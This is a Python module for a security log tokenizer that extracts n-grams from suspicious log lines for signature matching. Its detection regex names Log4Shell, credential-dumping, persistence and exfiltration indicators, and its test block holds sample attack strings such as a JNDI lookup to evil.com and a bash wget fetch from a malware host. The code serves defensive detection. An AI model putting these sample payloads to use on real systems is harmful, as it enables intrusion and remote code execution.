"""
Log Tokenizer Module

Extracts n-grams from log messages for pattern matching.
Optimized for <1 μs processing time per log.
"""

import re
from typing import List, Set
import mmh3


class LogTokenizer:
    """Fast n-gram tokenizer for log pattern extraction"""

    def __init__(self, ngram_min: int = 4, ngram_max: int = 6, use_sliding_window: bool = True):
        """
        Initialize tokenizer

        Args:
            ngram_min: Minimum n-gram length
            ngram_max: Maximum n-gram length
            use_sliding_window: If True, use sliding window; else positional
        """
        self.ngram_min = ngram_min
        self.ngram_max = ngram_max
        self.use_sliding_window = use_sliding_window

        # Pre-compile regex patterns for speed
        self.url_pattern = re.compile(r'https?://[^\s]+')
        self.ip_pattern = re.compile(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')

        # Comprehensive suspicious pattern detection for CVEs
        self.suspicious_patterns = re.compile(
            r'('
            # Log4Shell (CVE-2021-44228)
            r'\$\{jndi:|'
            r'\$\{lower:|'
            r'\$\{upper:|'
            # Code execution
            r'Runtime\.exec|'
            r'ProcessBuilder|'
            r'/bin/bash\s+-c|'
            r'/bin/sh\s+-c|'
            r'cmd\.exe\s+/c|'
            r'powershell\.exe|'
            r'Invoke-Expression|'
            r'eval\(|'
            # Persistence
            r'crontab\s+@reboot|'
            r'crontab\s+-e|'
            r'systemctl\s+enable|'
            r'schtasks\s+/create|'
            # SMB/Network exploits (EternalBlue)
            r'\\\\PIPE\\\\|'
            r'SMB[12]|'
            r'NT_STATUS_|'
            r'PeekNamedPipe|'
            # Exchange exploits (ProxyLogon)
            r'/ecp/DDI/|'
            r'X-AnonResource-Backend|'
            r'X-BEResource|'
            r'autodiscover\.json|'
            r'\.aspx.*eval\(|'
            # Netlogon (Zerologon)
            r'NetrServerAuthenticate|'
            r'NetrServerReqChallenge|'
            r'DsGetNCChanges|'
            r'DRSUAPI|'
            r'lsadump::dcsync|'
            # RDP exploits (BlueKeep)
            r'MS_T120|'
            r'rdpdr\.sys|'
            r'termdd\.sys|'
            # Credential access
            r'lsass\.exe|'
            r'procdump|'
            r'MiniDumpWriteDump|'
            r'mimikatz|'
            r'secretsdump\.py|'
            # Data exfiltration
            r'base64\s+-d|'
            r'curl.*-X\s+POST|'
            r'wget.*--post|'
            r'scp\s+-r|'
            # Ransomware indicators
            r'\.encrypted|'
            r'\.locked|'
            r'README.*DECRYPT|'
            r'bitcoin\s+address'
            r')',
            re.IGNORECASE
        )

    def tokenize(self, log_text: str) -> Set[str]:
        """
        Extract n-grams from log text - SELECTIVE MODE

        Only tokenizes suspicious indicators, not entire log.
        This dramatically reduces false positives.

        Args:
            log_text: Raw log message

        Returns:
            Set of n-gram tokens from suspicious parts only

        Example:
            Input: "${jndi:ldap://evil.com}"
            Output: {"${jn", "{jnd", "jndi", "ndi:", ":lda", "ldap", ...}
        """
        tokens = set()
        found_suspicious = False

        # First, check if there are any suspicious patterns at all
        suspicious = self.suspicious_patterns.findall(log_text)

        if not suspicious:
            # No suspicious patterns - return empty set (don't tokenize benign logs)
            return tokens

        # Found suspicious patterns - tokenize them
        for match in suspicious:
            if isinstance(match, tuple):
                match = match[0]  # Handle regex groups

            # Add exact match as token
            tokens.add(match.lower())

            # Add n-grams from suspicious match
            tokens.update(self._extract_ngrams(match))
            found_suspicious = True

        # Only if suspicious patterns found, check URLs
        if found_suspicious:
            urls = self.url_pattern.findall(log_text)
            for url in urls:
                # Only tokenize URLs with suspicious content
                if any(keyword in url.lower() for keyword in ['jndi', 'ldap', 'rmi', 'exec', 'payload', 'shell', 'backdoor']):
                    tokens.update(self._extract_ngrams(url))

        return tokens

    def _extract_ngrams(self, text: str) -> Set[str]:
        """
        Extract character-level n-grams from text

        Args:
            text: Input text

        Returns:
            Set of n-grams
        """
        ngrams = set()
        text_lower = text.lower()

        for n in range(self.ngram_min, self.ngram_max + 1):
            if self.use_sliding_window:
                # Sliding window approach
                for i in range(len(text_lower) - n + 1):
                    ngrams.add(text_lower[i:i+n])
            else:
                # Positional approach (non-overlapping)
                for i in range(0, len(text_lower), n):
                    if i + n <= len(text_lower):
                        ngrams.add(text_lower[i:i+n])

        return ngrams

    def hash_tokens(self, tokens: Set[str]) -> Set[int]:
        """
        Hash tokens using MurmurHash3 for Bloom filter storage

        Args:
            tokens: Set of string tokens

        Returns:
            Set of hashed integers
        """
        return {mmh3.hash(token) for token in tokens}

    def extract_keywords(self, log_text: str) -> List[str]:
        """
        Extract key suspicious keywords (non-n-gram) from log

        Args:
            log_text: Raw log message

        Returns:
            List of suspicious keywords found
        """
        keywords = []

        # Check for CVE indicators
        if '${jndi:' in log_text.lower():
            keywords.append('LOG4SHELL_JNDI')
        if 'runtime.exec' in log_text.lower():
            keywords.append('JAVA_EXEC')
        if any(cmd in log_text.lower() for cmd in ['/bin/bash', 'cmd.exe', 'powershell']):
            keywords.append('SHELL_EXEC')
        if any(persist in log_text.lower() for persist in ['crontab', 'systemctl', 'schtasks']):
            keywords.append('PERSISTENCE')
        if 'smb' in log_text.lower() or 'pipe' in log_text.lower():
            keywords.append('SMB_EXPLOIT')

        return keywords

    def tokenize_signature(self, signature: str) -> Set[str]:
        """
        Tokenize a CVE signature pattern (same as log tokenization for consistency)

        Args:
            signature: CVE attack pattern

        Returns:
            Set of tokens
        """
        return self.tokenize(signature)


class FastTokenCache:
    """
    LRU cache for tokenization results to speed up repeated logs
    """

    def __init__(self, max_size: int = 10000):
        """
        Initialize cache

        Args:
            max_size: Maximum cache entries
        """
        self.cache = {}
        self.max_size = max_size
        self.hits = 0
        self.misses = 0

    def get(self, log_text: str) -> Set[str]:
        """Get cached tokens or None"""
        key = hash(log_text)
        if key in self.cache:
            self.hits += 1
            return self.cache[key]
        self.misses += 1
        return None

    def put(self, log_text: str, tokens: Set[str]):
        """Cache tokenization result"""
        if len(self.cache) >= self.max_size:
            # Simple eviction: remove 10% oldest entries
            to_remove = self.max_size // 10
            for _ in range(to_remove):
                self.cache.pop(next(iter(self.cache)))

        self.cache[hash(log_text)] = tokens

    def get_stats(self) -> dict:
        """Get cache statistics"""
        total = self.hits + self.misses
        hit_rate = self.hits / total if total > 0 else 0
        return {
            'hits': self.hits,
            'misses': self.misses,
            'hit_rate': hit_rate,
            'size': len(self.cache)
        }


if __name__ == "__main__":
    # Test tokenizer
    tokenizer = LogTokenizer()

    test_logs = [
        "${jndi:ldap://evil.com/exploit}",
        "Runtime.exec('/bin/bash -c wget http://malware.com')",
        "crontab entry added: @reboot /tmp/.hidden/backdoor.sh",
        "SMB connection to \\\\PIPE\\\\samr"
    ]

    print("Tokenization Test:")
    print("=" * 60)
    for log in test_logs:
        tokens = tokenizer.tokenize(log)
        keywords = tokenizer.extract_keywords(log)
        print(f"\nLog: {log}")
        print(f"Tokens ({len(tokens)}): {sorted(list(tokens))[:10]}...")
        print(f"Keywords: {keywords}")
